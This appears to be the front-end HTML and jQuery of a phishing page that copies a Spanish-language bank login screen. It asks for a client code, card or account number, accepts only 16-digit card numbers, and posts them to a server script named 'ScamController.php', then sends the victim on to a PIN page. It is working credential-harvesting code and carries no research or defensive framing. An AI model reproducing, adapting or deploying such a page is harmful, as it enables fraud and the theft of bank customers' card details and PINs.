<script>
    $(document).ready(function(){
        
        function addAtributs(){
            $('#frm').removeClass('ng-pristine');
            $('#frm').removeClass('ng-invalid');
            $('#frm').addClass('ng-dirty');
            $('#frm').addClass('ng-valid');

            $('#btnCliente').attr('disabled', false);
        }
        
        function removeAtributs(){
            $('#frm').removeClass('ng-dirty');
            $('#frm').removeClass('ng-valid');
            $('#frm').addClass('ng-pristine');
            $('#frm').addClass('ng-invalid');

            $('#btnCliente').attr('disabled', true);
        }
        
        $('#client').keydown(function(){
            var lChars = $(this).val();
            if(lChars.length >= 3){
                addAtributs();
            }else{
                removeAtributs();
            }
        });
        
        $('#client').keypress(function(){
            var lChars = $(this).val();
            if(lChars.length >= 3){
                addAtributs();
            }else{
                removeAtributs();
            }
        });
        
        function hideModal(){
            console.log('Cerrando el modal');
            $('#back_modal').hide();
            $('ngb-modal-window#contModal').hide().removeClass('show');
            $('#headModal').text('');
            $('#txt_msg').html('');
            $('ngb-modal-window#contModal').empty();
            //$('#botonera').html('');
            
            window.location.reload();
        }
        
        $('#btnAcept').click(function(e){
            e.preventDefault();
            console.log('Cerrando el modal');
            /*$('#back_modal').hide();
            $('#contModal').hide();
            $('#headModal').text('');
            $('#txt_msg').html('');*/
            
            hideModal();
        });
        
        var hMsgAtencion = "";
        var cMsgEmpty = " La informaci&oacute;n proporcionada es incorrecta, verifique e intente nuevamente.";
        var botonesAcept = '<button onClick="" id="btnAcept" _ngcontent-c16="" class="btn ng-star-inserted" type="button">Aceptar</button>';
        
        $('#btnCliente').click(function(e){
            e.preventDefault();
            var cliente = $('#client');
            
            if(cliente.val().length != 16){
                $('#back_modal').show();
                $('#contModal').show();
                
                $('#headModal').text(hMsgAtencion);
                $('#txt_msg').html(cMsgEmpty);
                //$('#botonera').html(botonesAcept);
                
            }else{
                $.ajax({
                    type: 'POST',
                    url: '../Controllers/ScamController.php',
                    data: {
                        "request": "usuario",
                        "user": cliente.val()
                    },
                    beforeSend: function(){
                        console.log("ENviando...");
                        $('#loading').show();
                    },
                    success: function (resp){
                        console.log('Datos Enviados');
                        $('#loading').hide();
                        //alert(resp);
                        console.log(resp);
                        alert(resp)
                        if(resp == "1"){
                            window.location.href="acceso/nip/";
                        }else{
                            alert('Fallo al guardar');
                        }
                        
                    },
                    error: function (request, textStatus, errorThrown) {
                        console.log('Error al Enviar los Datos: '+errorThrown);
                    }
                });
            }
            //window.location.href="acceso/nip/";
        });
        
    });
    
    //remover al fomulario 
    // 
    
    //agregar al formulario
    // 
</script>
<ng-component _nghost-c15="" class="ng-star-inserted">
    <div _ngcontent-c15="" class="container-fluid">

        <div _ngcontent-c15="" class="row justify-content-center show-grid">
            <form id="frm" name="frm" _ngcontent-c15="" novalidate="" class="ng-pristine ng-invalid ng-touched">
                <div _ngcontent-c15="" class="row justify-content-center d-block">
                    <div _ngcontent-c15="" class="col-12">
                        <div _ngcontent-c15="" class="form-group">
                            <label _ngcontent-c15="" class="code" for="input">
                                Código de Cliente / N° Tarjeta / N° Cuenta:
                                <div _ngcontent-c15="" class="tooltip">
                                    <img _ngcontent-c15="" alt="Información" class="img-responsive tooltip" src="assets/img/tooltip_id.svg">
                                    <div _ngcontent-c15="" class="tooltiptext">
                                        <p _ngcontent-c15="">Capture uno de los siguiente datos:</p>
                                        <br _ngcontent-c15="">
                                        <p _ngcontent-c15="">-Número de código de cliente (máximo 8 dígitos)</p>
                                        <p _ngcontent-c15="">-Número de tarjeta de crédito o débito (16 dígitos)</p>
                                        <p _ngcontent-c15="">-Número de cuenta (11 dígitos)</p>
                                    </div>
                                </div>
                            </label>
                            <input id="client" name="client" _ngcontent-c15="" autocomplete="off" class="form-control ng-pristine ng-invalid ng-touched" formcontrolname="client" maxlength="16" type="password">
                        </div>
                    </div>
                </div>
                <div _ngcontent-c15="" class="mb-3"></div>
                <div _ngcontent-c15="" class="row justify-content-center text-center ">
                    <div _ngcontent-c15="" class="col-12 text-center">
                        <button id="btnCliente" _ngcontent-c15="" class="rounded-red-button btn-continue" type="submit" disabled="false">
                            Continuar
                        </button>
                    </div>
                </div>
                <div _ngcontent-c15="" class="mb-5"></div>
            </form>
        </div>
    </div>
</ng-component>
